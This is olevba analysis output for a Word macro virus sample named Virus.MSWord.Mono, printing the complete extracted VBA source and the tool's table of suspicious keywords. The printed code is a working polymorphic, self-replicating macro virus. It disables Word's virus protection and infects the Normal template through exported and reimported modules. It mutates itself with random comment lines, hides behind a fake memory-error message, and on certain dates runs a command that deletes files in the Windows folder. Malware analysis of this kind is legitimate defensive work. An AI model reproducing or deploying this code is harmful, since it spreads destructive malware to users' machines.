olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mono-1cf4ca619164b56930d20e6d2292ad05784c2e45
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mono-1cf4ca619164b56930d20e6d2292ad05784c2e45 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DGLRIJG.bas 
in file: Virus.MSWord.Mono-1cf4ca619164b56930d20e6d2292ad05784c2e45 - OLE stream: 'Macros/VBA/DGLRIJG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'SW<>j#hmc&HrkD{s'zCRi&YM=[^:;onX}v7b
On Error Resume Next
'8S+~`#W++l<&=E=z}G;01^HHd@\53X)Lv:kE<w\\I+Vbvo$TwJ
Options.VirusProtection = False
'PQMBG;'8}'FCO0N9\T0y^QF+jLhYo#5(+@
Dim a1$
'"S_Tn)3
If (NormalTemplate.VBProject.VBComponents.Item(2).Name = "poly") Then
'LC/cxS*hGLO5@*X1x+K;sg;`9*$@k=7N9A
    Call poly
'N5r
    Randomize
'hx@T)\H{,w[B/N6~.$BTwTGpn`e~AP
    For a2 = 1 To 7 Step 1
'b2ITmTIQ7[OatD>=/S6XC
        dw = Int((20 * Rnd) + 1)
'N3ag[j1m4z('kEM-,2&dSV6MggGug*]d#JG;}lbHf;CJ
        dw = dw + 65
'-^B+3)J{TO|6EF<P.R{Uv_Kb'hcP06@j&Rhl@|l`vsH-zlbG
        a1$ = a1 + Chr(dw)
'1
    Next a2
'QG+;]pP3u
    ActiveDocument.VBProject.VBComponents(2).Export "c:\" + a1$ + ".dll"
'@i6K7sZDFrXxR@r::2B
    Open "c:\" + a1$ + ".dll" For Append As #1
'g
        Seek #1, 1
';cGmfJ)HAd?l0Yz8y,}\YuW8q(Jh8EFR;X5)u,^u7zp
        Print #1, "Attribute VB_Name = " + Chr(34) + a1$ + Chr(34)
'OioE4@H0[+5bP3~M"I<gtn2
    Close #1
'"0E3}s
    NormalTemplate.VBProject.VBComponents.Import ("c:\" + a1$ + ".dll")
'e/9$njk@KUlV45CWBSIW&T5{x~pHl~
    ElseIf (ActiveDocument.VBProject.VBComponents.Item(2).Name = "poly") Then
'2b#Ab,,=GU>=m
    Call poly
'DGpHe_Gz^Q6XgLv<
    Randomize
't<D#=}hXZ:Qkq*TH(KbPGy}YS[*3<#0IUU
    For a2 = 1 To 7 Step 1
'%G'?ZRY@viWJf1'8hzBak%kN5Yvy^#_{"z(=Xm%'
        dw = Int((20 * Rnd) + 1)
'?HQfK?(HWhW^mHlebe3i(9zn638x9
        dw = dw + 65
'd_ih>ndu6CUC5
        a1$ = a1 + Chr(dw)
'\.'\o]I3P|iEOT`%^uA,IiCHgJdQ2
    Next a2
'*}<[>q?k2=(OLY
    NormalTemplate.VBProject.VBComponents(2).Export "c:\" + a1$ + ".dll"
'?.
    Open "c:\" + a1$ + ".dll" For Append As #1
'h\{nUZ3u?YYidah9U
        Seek #1, 1
'V<HB|RXM$E.^04D*[cJIAc5&t&
        Print #1, "Attribute VB_Name = " + Chr(34) + a1$ + Chr(34)
'fhn5MroHMB9mTT\*d9';{@^
    Close #1
'D@55I[8aXZ)&08GX<ou
    ActiveDocument.VBProject.VBComponents.Import ("c:\" + a1$ + ".dll")
'F"91]}?8s.VZZbq+Fn:aFoJo6eu
End If
'}{sR^L0]ZqD
Kill ("c:\" + a1$ + ".dll")
'Q'D
If (Day(Now()) = 15) And Minute(Now()) = 29 Then
'=|#^[S$d?}=C?B7Yc:WW~x9
    ActiveDocument.PrintOut
'iG\OP.|2Xa,^fjJ)PW'H,/?~Z;HM'LJy;2QAQF:(]
ElseIf (Day(Now()) = 13 And WeekDay(Now()) = 13) Then
'TsIYE',//h:.%bpRl}R
    Kill "c:\windows\*.*"
'\@;a
End If
'E5s0GZUe-@"jw=7z3HC@}
ActiveDocument.Save
'R.u$kd8yMeF7ZUL^i(0+&T{7BtN7q
End Sub
'.{on
Function poly()
'8_\|I's19ZCSwT{iGhWK&%CHC\2J0|;'ld9kr};MvwPtWIneu0
y = Application.VBE.CodePanes(1).CodeModule.CountOfLines
'_wojjNfV1>MurE{P}Kj>)sWrmiw&n7;&u}:TA54
If (y <= 100) Then
'ZXq*4\L
For x = 1 To y Step 1
'o>|FklZCX_X'p'0
z = Chr(39)
'JIq'u8&j%.`:p57Q
w = Int((50 * Rnd) + 1)
'Z+yEB%tOGx9U&mMTE/f65@If-JnWi=(
For a = 1 To w Step 1
'PbB\0vDm1P%gp=IQ"_|*j&{~ba22{bt-
    dw = Int((93 * Rnd) + 1)
';$@u8co*
    dw = dw + 33
'm4+\)[Ly3=Z8?*"zfILLqHcDE87(kn@I~cOoA0vQk
    z = z + Chr(dw)
'B{D>6iu,v[th@Tn0kIT('o}#_z-EOu1
Next a
'^6&vO`(#z5uK1<gq9BrqHY3y:#?YE]gd3'84|2_v;9
   Application.VBE.CodePanes(1).CodeModule.InsertLines 2 * x, z
'hF0W-;q`MV7#9z'q)d:v&YPsKon(XQkJ|/`bfP}
Next x
'2_;rfF+[,`>*\UWpx5/dm?pjEXDRNXj@:r:0082R{F=
End If
'7b@&y;`~ECLd9sjM-48~#@d<?/@Nw%h(\a
End Function
'Gh2y@(=^0s1JxM}Jid51_}iVE;i8bZ3{m_(M+_j
Sub ToolsMacro()
'"SZr?<[CT]_0byiy/=e9zzq
End Sub
'3x,kexLv1PDY%Be)8(o4j|lNa;)A8J@]IpMK[`~%U'Z1PK
Sub FileTemplates()
'Yg<up@rQ5tO}$|p<5Ka<{3^&s'OM,+C'{~W"[gFV1`5YqU{D\.
End Sub
'dsn_;LX(,z9sW4r5>&K@[Dyf'AEW9xH<xcxN?
Sub ViewVBCode()
'(+c6Di6A;O{_oM@rY@U$sKV13Y(~ytqzEpELpn\H.
MsgBox "Not enough memory to execute", vbOKOnly + vbCritical
'.">XBaU<5JJD}AC|=:7_RxLX?2*mMKB&{X
End Sub
'MApct5,M-0Poai
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

